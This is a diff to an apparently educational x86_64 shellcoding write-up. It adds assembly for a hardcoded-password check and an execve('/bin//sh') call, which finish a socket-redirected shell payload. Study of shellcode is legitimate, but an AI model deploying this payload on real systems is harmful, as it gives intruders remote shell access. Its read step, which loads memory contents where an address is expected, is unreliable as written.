@@ -120,12 +120,67 @@ Now is time to duplicate `stdin`, `stdout` and `stderr` to the sock_id. This is 
         mov rsi, 2 
         syscall 
  ```
-## Password Stuff
----
+#### Password Stuff
+The code for the password stuff is the same as in the Assignment #1. A `“Passwd: “` prompt is shown and a password max of 8 characters is received from the user input. This input is compared to the hardcoded password and if equals the program continues, else, the program exits with a Segmentation Fault.
+```asm
+write_syscall: 
 
+        mov rax, 1                              ; Syscall number for write() 
+        mov rdi, r9 
+        lea rsi, [rel PASSWD_PROMPT]            ; Rel addressing to prompt 
+        mov rdx, 8                              ; Length of PAsswd: string 
+        syscall 
 
+read_syscall: 
 
+        xor rax, rax                            ; Syscall number for read() 
+        mov rdi, r9 
+        mov rsi, [rel PASSWD_INPUT]             ; Where to store the input passwd 
+        mov rdx, 8                              ; Chars to read 
+        syscall 
 
+compare_passwords: 
+
+        mov rax, "12345678"                     ; Thgis is the password 
+        lea rdi, [rel PASSWD_INPUT]             ; Compare the QWord 
+        scasq 
+        jne exit_program                        ; Passwords don't match, exit 
+```
+#### The Shell with Execve
+
+Last step is to execute `/bin/sh`. Stack Technique is used to store the string `/bin//sh` and the length of the string: 
+```asm
+execve_syscall: 
+
+        ; First NULL push 
+        xor rax, rax 
+        push rax 
+
+        ; push /bin//sh in reverse 
+        mov rbx, 0x68732f2f6e69622f 
+        push rbx 
+
+        ; store /bin//sh address in RDI 
+        mov rdi, rsp 
+
+        ; Second NULL push 
+        push rax 
+
+        ; set RDX 
+        mov rdx, rsp 
+
+        ; Push address of /bin//sh 
+        push rdi 
+
+        ; set RSI 
+        mov rsi, rsp 
+
+        ; Call the Execve syscall 
+        add rax, 59 
+        syscall 
+```
+
+#### Putting All Together
 
 
 
